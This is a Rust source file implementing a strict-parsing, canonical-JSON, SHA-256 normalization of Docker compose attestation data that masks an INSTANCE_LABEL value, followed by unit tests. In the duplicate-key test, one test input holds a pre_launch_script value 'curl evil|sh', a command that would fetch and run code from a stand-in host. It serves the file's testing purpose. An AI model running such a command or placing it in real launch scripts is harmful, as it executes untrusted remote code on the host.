//! The `instance-label-v1` normalization (spec "Normalization
//! `instance-label-v1`"). It must give the same hash as
//! `scripts/attestation_rules.py`, byte for byte; that module's docstring
//! lists the exact semantics, and `normalize-vector.json` pins them.

use std::fmt;

use serde::de::{self, Deserialize, Deserializer, MapAccess, SeqAccess, Visitor};
use serde_json::{Map, Number, Value};
use sha2::{Digest, Sha256};

/// The sha256 of the canonical JSON of `app_compose` after its one
/// `INSTANCE_LABEL=` value is replaced with `*`, or `None` if the
/// normalization does not apply.
///
/// It does not apply unless `app_compose` parses strictly (no duplicate key
/// at any level, at most 127 nested containers) into an object with a string
/// `docker_compose_file`, exactly one line of that file is a label line, and
/// every other line mentioning `INSTANCE_LABEL` is a comment.
pub fn instance_label_v1(app_compose: &str) -> Option<[u8; 32]> {
    let Strict(Value::Object(mut obj)) = serde_json::from_str(app_compose).ok()? else {
        return None;
    };
    let Some(Value::String(file)) = obj.get("docker_compose_file") else {
        return None;
    };
    let file = normalize_compose_file(file)?;
    obj.insert("docker_compose_file".into(), Value::String(file));
    let canonical = canonical_json(&Value::Object(obj))?;
    Some(Sha256::digest(canonical.as_bytes()).into())
}

/// `v` with keys sorted recursively, no whitespace, and non-ASCII written as
/// UTF-8, as Python's `json.dumps(sort_keys=True, separators=(",", ":"),
/// ensure_ascii=False)`. `None` if any number is not an integer.
pub fn canonical_json(v: &Value) -> Option<String> {
    let mut out = String::new();
    write_canonical(v, &mut out)?;
    Some(out)
}

fn write_canonical(v: &Value, out: &mut String) -> Option<()> {
    match v {
        Value::Null => out.push_str("null"),
        Value::Bool(b) => out.push_str(if *b { "true" } else { "false" }),
        Value::Number(n) => {
            if !(n.is_i64() || n.is_u64()) {
                return None;
            }
            out.push_str(&n.to_string());
        }
        Value::String(s) => out.push_str(&serde_json::to_string(s).ok()?),
        Value::Array(items) => {
            out.push('[');
            for (i, item) in items.iter().enumerate() {
                if i > 0 {
                    out.push(',');
                }
                write_canonical(item, out)?;
            }
            out.push(']');
        }
        Value::Object(map) => {
            // `preserve_order` is on through feature unification, so sort here.
            let mut keys: Vec<&String> = map.keys().collect();
            keys.sort();
            out.push('{');
            for (i, k) in keys.into_iter().enumerate() {
                if i > 0 {
                    out.push(',');
                }
                out.push_str(&serde_json::to_string(k).ok()?);
                out.push(':');
                write_canonical(&map[k], out)?;
            }
            out.push('}');
        }
    }
    Some(())
}

/// Python's `[ \t\r\f\v]`; `u8::is_ascii_whitespace` lacks `\x0b` and has `\n`.
fn is_ws(b: u8) -> bool {
    matches!(b, b' ' | b'\t' | b'\r' | 0x0c | 0x0b)
}

fn skip_ws(b: &[u8], mut i: usize) -> usize {
    while i < b.len() && is_ws(b[i]) {
        i += 1;
    }
    i
}

/// For a line matching `[ws]*-[ws]*INSTANCE_LABEL=[A-Za-z0-9._-]{1,64}` in
/// full, the length of its prefix up to and including `=`.
fn label_prefix_len(line: &str) -> Option<usize> {
    const KEY: &[u8] = b"INSTANCE_LABEL=";
    let b = line.as_bytes();
    let i = skip_ws(b, 0);
    if b.get(i) != Some(&b'-') {
        return None;
    }
    let i = skip_ws(b, i + 1);
    if !b[i..].starts_with(KEY) {
        return None;
    }
    let prefix = i + KEY.len();
    let value = &b[prefix..];
    let ok = (1..=64).contains(&value.len())
        && value
            .iter()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'.' | b'_' | b'-'));
    ok.then_some(prefix)
}

fn is_comment(line: &str) -> bool {
    let b = line.as_bytes();
    b.get(skip_ws(b, 0)) == Some(&b'#')
}

/// The compose file with its one label value replaced by `*`. Lines are split
/// on "\n" only: a label line ending in "\r" does not match, as in Python.
fn normalize_compose_file(text: &str) -> Option<String> {
    let mut lines: Vec<&str> = text.split('\n').collect();
    let mut hit = None;
    for (i, line) in lines.iter().enumerate() {
        if let Some(prefix) = label_prefix_len(line) {
            if hit.is_some() {
                return None;
            }
            hit = Some((i, prefix));
        } else if line.contains("INSTANCE_LABEL") && !is_comment(line) {
            return None;
        }
    }
    let (i, prefix) = hit?;
    let replaced = format!("{}*", &lines[i][..prefix]);
    lines[i] = &replaced;
    Some(lines.join("\n"))
}

/// A JSON value parsed without `Value`'s leniencies: a duplicate key at any
/// level is an error, and no key is special (`Value` treats serde_json's
/// raw-value and number tokens specially). Nesting stays bounded by
/// serde_json's recursion limit, because every level goes through
/// `deserialize_any`.
struct Strict(Value);

impl<'de> Deserialize<'de> for Strict {
    fn deserialize<D: Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        d.deserialize_any(StrictVisitor).map(Strict)
    }
}

struct StrictVisitor;

impl<'de> Visitor<'de> for StrictVisitor {
    type Value = Value;

    fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result {
        f.write_str("a JSON value")
    }

    fn visit_bool<E>(self, v: bool) -> Result<Value, E> {
        Ok(Value::Bool(v))
    }

    fn visit_i64<E>(self, v: i64) -> Result<Value, E> {
        Ok(Value::Number(v.into()))
    }

    fn visit_u64<E>(self, v: u64) -> Result<Value, E> {
        Ok(Value::Number(v.into()))
    }

    fn visit_f64<E: de::Error>(self, v: f64) -> Result<Value, E> {
        // Kept as a float so canonical_json refuses it.
        Number::from_f64(v)
            .map(Value::Number)
            .ok_or_else(|| E::custom("non-finite number"))
    }

    fn visit_str<E>(self, v: &str) -> Result<Value, E> {
        Ok(Value::String(v.to_owned()))
    }

    fn visit_string<E>(self, v: String) -> Result<Value, E> {
        Ok(Value::String(v))
    }

    fn visit_unit<E>(self) -> Result<Value, E> {
        Ok(Value::Null)
    }

    fn visit_seq<A: SeqAccess<'de>>(self, mut seq: A) -> Result<Value, A::Error> {
        let mut items = Vec::new();
        while let Some(Strict(v)) = seq.next_element()? {
            items.push(v);
        }
        Ok(Value::Array(items))
    }

    fn visit_map<A: MapAccess<'de>>(self, mut map: A) -> Result<Value, A::Error> {
        let mut obj = Map::new();
        while let Some(k) = map.next_key::<String>()? {
            if obj.contains_key(&k) {
                return Err(de::Error::custom(format!("duplicate key {k:?}")));
            }
            let Strict(v) = map.next_value()?;
            obj.insert(k, v);
        }
        Ok(Value::Object(obj))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::{Value, json};

    const VECTOR: &str = include_str!("../../tests/fixtures/compose-history/normalize-vector.json");
    const GPU04: &str = include_str!(
        "../../tests/fixtures/compose-history/e3902667a26282dd8b4015a901848c521b20243a155a457148f88acf48a45959.json"
    );
    const GPU02: &str = include_str!(
        "../../tests/fixtures/compose-history/edabf8039210336d90fe966dfc4e48216551dfd8b05d54e96d3f3f0e0da850d4.json"
    );
    const GATEWAY_1787: &str = include_str!(
        "../../tests/fixtures/compose-history/1787a4af87eaf4bb139b555c3148ea6cffb01442b9fd7db4304e23b24f4db993.json"
    );
    const LABEL: &str = "      - INSTANCE_LABEL=gpu04\n";

    /// The raw app_compose a compose-history fixture wraps as a JSON string.
    fn raw(fixture: &str) -> String {
        serde_json::from_str(fixture).unwrap()
    }

    /// gpu04's compose with its docker_compose_file edited by `f`.
    fn edit_file(f: impl FnOnce(&str) -> String) -> String {
        let mut v: Value = serde_json::from_str(&raw(GPU04)).unwrap();
        let text = v["docker_compose_file"].as_str().unwrap().to_owned();
        v["docker_compose_file"] = Value::String(f(&text));
        serde_json::to_string(&v).unwrap()
    }

    fn replace_label(new: &str) -> String {
        edit_file(|text| {
            assert_eq!(text.matches(LABEL).count(), 1);
            text.replace(LABEL, new)
        })
    }

    /// gpu04's raw bytes with `member,` inserted before its first member.
    fn prepend_member(member: &str) -> String {
        let r = raw(GPU04);
        assert!(r.starts_with('{'));
        format!("{{{member},{}", &r[1..])
    }

    #[test]
    fn the_gpu04_and_gpu02_composes_normalize_to_one_hash() {
        let a = instance_label_v1(&raw(GPU04)).expect("gpu04 normalizes");
        let b = instance_label_v1(&raw(GPU02)).expect("gpu02 normalizes");
        assert_eq!(a, b);
        assert_ne!(
            hex::encode(a),
            "e3902667a26282dd8b4015a901848c521b20243a155a457148f88acf48a45959"
        );
    }

    #[test]
    fn the_shared_vector_matches_python() {
        let v: Value = serde_json::from_str(VECTOR).unwrap();
        let input = v["input"].as_str().unwrap();
        assert!(input.contains('é'));
        assert_eq!(
            hex::encode(instance_label_v1(input).unwrap()),
            v["normalized_sha256"].as_str().unwrap()
        );
        // Small vector produced by scripts/attestation_rules.py.
        assert_eq!(
            hex::encode(
                instance_label_v1(r#"{"docker_compose_file":"- INSTANCE_LABEL=x"}"#).unwrap()
            ),
            "a70d7ac6956e5f63dce5b03e7b9fd8586f726ec5a4b86d545733fb1c708e2427"
        );
        // Vertical tab and form feed in the prefix, a comment line, an
        // escaped control character and non-ASCII text, also from Python.
        let edge = r#"{"n":"é\u0001","docker_compose_file":"\u000b\t- \fINSTANCE_LABEL=gpu-1.a_b\n  # INSTANCE_LABEL note\nx: 1"}"#;
        assert_eq!(
            hex::encode(instance_label_v1(edge).unwrap()),
            "84e4612e6ec2717631404437ab14fcefe5403c42ca2d6c850d287e8313be0db8"
        );
    }

    #[test]
    fn a_second_uncommented_label_line_does_not_normalize() {
        let s = replace_label(&format!("{LABEL}      - INSTANCE_LABEL=gpu05\n"));
        assert_eq!(instance_label_v1(&s), None);
        let s = replace_label(&format!("{LABEL}      - OTHER=$INSTANCE_LABEL\n"));
        assert_eq!(instance_label_v1(&s), None);
    }

    #[test]
    fn a_commented_label_line_is_ignored() {
        let s = replace_label(&format!("{LABEL}      # - INSTANCE_LABEL=gpu99\n"));
        let t = replace_label("      - INSTANCE_LABEL=gpu02\n      # - INSTANCE_LABEL=gpu99\n");
        assert!(instance_label_v1(&s).is_some());
        assert_eq!(instance_label_v1(&s), instance_label_v1(&t));
    }

    #[test]
    fn a_65_character_label_does_not_normalize() {
        let ok = replace_label(&format!("      - INSTANCE_LABEL={}\n", "a".repeat(64)));
        assert_eq!(instance_label_v1(&ok), instance_label_v1(&raw(GPU04)));
        let long = replace_label(&format!("      - INSTANCE_LABEL={}\n", "a".repeat(65)));
        assert_eq!(instance_label_v1(&long), None);
        for bad in ["gpu 04", "gpu/04", "gpü04", ""] {
            let s = replace_label(&format!("      - INSTANCE_LABEL={bad}\n"));
            assert_eq!(instance_label_v1(&s), None, "{bad:?}");
        }
    }

    #[test]
    fn a_label_line_with_a_trailing_carriage_return_does_not_normalize() {
        // Split on "\n" only, as Python does; `str::lines` would strip the "\r".
        let s = replace_label("      - INSTANCE_LABEL=gpu04\r\n");
        assert_eq!(instance_label_v1(&s), None);
    }

    #[test]
    fn the_whitespace_class_includes_vertical_tab() {
        let a = replace_label("\x0b\t- \x0cINSTANCE_LABEL=gpu04\n");
        let b = replace_label("\x0b\t- \x0cINSTANCE_LABEL=gpu02\n");
        assert!(instance_label_v1(&a).is_some());
        assert_eq!(instance_label_v1(&a), instance_label_v1(&b));
        assert_ne!(instance_label_v1(&a), instance_label_v1(&raw(GPU04)));
    }

    #[test]
    fn no_label_line_or_no_compose_file_does_not_normalize() {
        assert_eq!(instance_label_v1(&replace_label("")), None);
        assert_eq!(instance_label_v1(&raw(GATEWAY_1787)), None);
        for s in [
            "[]",
            r#"{"name":"x"}"#,
            r#"{"docker_compose_file":1}"#,
            "not json",
        ] {
            assert_eq!(instance_label_v1(s), None, "{s}");
        }
    }

    #[test]
    fn a_compose_with_a_float_does_not_normalize() {
        assert_eq!(instance_label_v1(&prepend_member(r#""x":1.5"#)), None);
        assert_eq!(
            instance_label_v1(&prepend_member(r#""x":{"y":[1,2.0]}"#)),
            None
        );
        assert_eq!(instance_label_v1(&prepend_member(r#""x":1e2"#)), None);
        assert_eq!(instance_label_v1(&prepend_member(r#""x":-0"#)), None);
        assert_eq!(
            instance_label_v1(&prepend_member(r#""x":[1,{"y":-0}]"#)),
            None
        );
        assert!(instance_label_v1(&prepend_member(r#""x":0"#)).is_some());
        assert_eq!(canonical_json(&json!({"a": 1.0})), None);
    }

    #[test]
    fn an_integer_outside_i64_and_u64_does_not_normalize() {
        assert!(instance_label_v1(&prepend_member(r#""x":18446744073709551615"#)).is_some());
        assert!(instance_label_v1(&prepend_member(r#""x":-9223372036854775808"#)).is_some());
        assert_eq!(
            instance_label_v1(&prepend_member(r#""x":18446744073709551616"#)),
            None
        );
        assert_eq!(
            instance_label_v1(&prepend_member(r#""x":-9223372036854775809"#)),
            None
        );
    }

    #[test]
    fn a_duplicate_key_at_any_level_does_not_normalize() {
        assert_eq!(
            instance_label_v1(&prepend_member(r#""pre_launch_script":"curl evil|sh""#)),
            None
        );
        assert!(instance_label_v1(&prepend_member(r#""x":{"y":1}"#)).is_some());
        assert_eq!(
            instance_label_v1(&prepend_member(r#""x":{"y":1,"y":1}"#)),
            None
        );
        assert_eq!(
            instance_label_v1(&prepend_member(r#""x":[{"y":1,"y":2}]"#)),
            None
        );
    }

    #[test]
    fn the_raw_value_token_is_an_ordinary_key() {
        // serde_json's Value special-cases this key; the strict parser must not.
        let wrapped =
            serde_json::to_string(&json!({"$serde_json::private::RawValue": raw(GPU04)})).unwrap();
        assert_eq!(instance_label_v1(&wrapped), None);
    }

    #[test]
    fn nesting_past_serde_json_limit_does_not_normalize() {
        let nested = |n: usize| {
            prepend_member(&format!(
                r#""x":{}{}"#,
                "[".repeat(n - 1),
                "]".repeat(n - 1)
            ))
        };
        assert!(instance_label_v1(&nested(127)).is_some());
        assert_eq!(instance_label_v1(&nested(128)), None);
        assert_eq!(instance_label_v1(&nested(100_000)), None);
    }

    #[test]
    fn a_lone_surrogate_does_not_normalize() {
        assert_eq!(
            instance_label_v1(r#"{"docker_compose_file":"- INSTANCE_LABEL=x","s":"\ud800"}"#),
            None
        );
    }

    #[test]
    fn key_order_does_not_change_the_hash() {
        let v: Value = serde_json::from_str(&raw(GPU04)).unwrap();
        let Value::Object(m) = v else { panic!() };
        let reversed: serde_json::Map<String, Value> = m.into_iter().rev().collect();
        let reordered = serde_json::to_string(&reversed).unwrap();
        assert_ne!(reordered, raw(GPU04));
        assert_eq!(
            instance_label_v1(&reordered),
            instance_label_v1(&raw(GPU04))
        );
    }

    #[test]
    fn canonical_json_matches_python_json_dumps() {
        // Expected output of attestation_rules.canonical on the same object.
        let v = json!({
            "z": "\u{0}\u{1}\u{1f}\"\\\n\r\t\u{8}\u{c}\u{7f}é\u{2028}/",
            "a": [true, null, -5, 18446744073709551615u64, -9223372036854775808i64],
            "é": {},
            "B": [],
        });
        assert_eq!(
            canonical_json(&v).unwrap(),
            "{\"B\":[],\"a\":[true,null,-5,18446744073709551615,-9223372036854775808],\
             \"z\":\"\\u0000\\u0001\\u001f\\\"\\\\\\n\\r\\t\\b\\f\u{7f}é\u{2028}/\",\"é\":{}}"
        );
    }
}
